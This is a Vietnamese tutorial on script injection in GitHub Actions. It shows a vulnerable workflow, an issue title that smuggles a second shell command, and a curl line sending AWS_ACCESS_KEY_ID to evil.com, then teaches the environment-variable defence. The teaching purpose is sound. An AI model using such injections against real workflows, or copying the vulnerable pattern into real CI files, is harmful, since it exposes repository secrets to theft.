# Bài 1: Script Injection — Khi User Input Trở thành Code

## Script Injection là gì?

Script Injection xảy ra khi **dữ liệu do người dùng nhập** (tên issue, PR title, comment...) được đưa thẳng vào lệnh shell trong workflow, cho phép kẻ xấu **thực thi code tùy ý** trên runner của bạn.

---

## Ví dụ workflow dễ bị tấn công

```yaml
on:
  issues:
    types: [opened]

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - name: Check issue title
        run: |
          ISSUE_TITLE="${{ github.event.issue.title }}"    # ← NGUY HIỂM
          if [[ "$ISSUE_TITLE" == *"bug"* ]]; then
            echo "Issue is about a bug"
          fi
```

Khi workflow chạy, `${{ github.event.issue.title }}` được thay thế **trước khi** shell thực thi lệnh. Nếu title là:

```
A"; echo "got your secrets
```

Lệnh shell thực sự được chạy sẽ là:

```bash
ISSUE_TITLE="A"; echo "got your secrets"
```

Dấu `"` đóng string, `;` bắt đầu lệnh mới, và `echo "got your secrets"` chạy độc lập. Kẻ tấn công có thể thay `echo` bằng:

```bash
curl https://evil.com?key=$AWS_ACCESS_KEY_ID
```

→ Secrets bị đánh cắp.

---

## Cách phòng thủ: Dùng Environment Variable

Thay vì inject trực tiếp vào lệnh, **lưu vào biến môi trường trước**:

```yaml
# ✅ AN TOÀN
steps:
  - name: Check issue title
    env:
      ISSUE_TITLE: ${{ github.event.issue.title }}    # ← gán vào env
    run: |
      # Dùng biến env trong shell — KHÔNG dùng ${{ }} trong run
      if [[ "$ISSUE_TITLE" == *"bug"* ]]; then
        echo "Issue is about a bug"
      fi
```

Khi dùng cách này, `${{ github.event.issue.title }}` được xử lý như **giá trị string thuần túy** và gán vào biến môi trường. Shell nhận chuỗi thô, không thể interpret nó như code.

---

## Rule của ngón tay cái

| Cách dùng | Rủi ro |
|---|---|
| `run: echo "${{ github.event.issue.title }}"` | ❌ Nguy hiểm — inject vào lệnh shell |
| `env: TITLE: ${{ ... }}` + `run: echo "$TITLE"` | ✅ An toàn — qua biến môi trường |
| `uses: some-action@v3` với `with: title: ${{ ... }}` | ✅ An toàn — GitHub xử lý input, không qua shell |

---

## Dùng Action thay vì `run` khi có thể

Nếu có action sẵn làm điều bạn cần, ưu tiên dùng action:

```yaml
# Thay vì tự viết curl để gọi GitHub API trong run:
# dùng action đã được kiểm tra:
- uses: actions/github-script@v6
  with:
    script: |
      github.rest.issues.addLabels({
        owner: context.repo.owner,
        repo: context.repo.repo,
        issue_number: context.issue.number,
        labels: ['bug']
      })
```

Inputs truyền vào action qua `with:` được GitHub xử lý an toàn, không đi qua shell.

---

## Các nguồn dữ liệu từ user cần thận trọng

- `github.event.issue.title` — tên issue
- `github.event.issue.body` — nội dung issue
- `github.event.pull_request.title` — tên PR
- `github.event.pull_request.body` — mô tả PR
- `github.event.comment.body` — comment
- `github.head_ref` — tên branch từ fork (có thể chứa ký tự đặc biệt)

Tất cả những giá trị này đều do người ngoài kiểm soát — **đừng bao giờ đưa thẳng vào lệnh `run:`**.

---

**Tiếp theo:** Third-party Actions và Permissions →
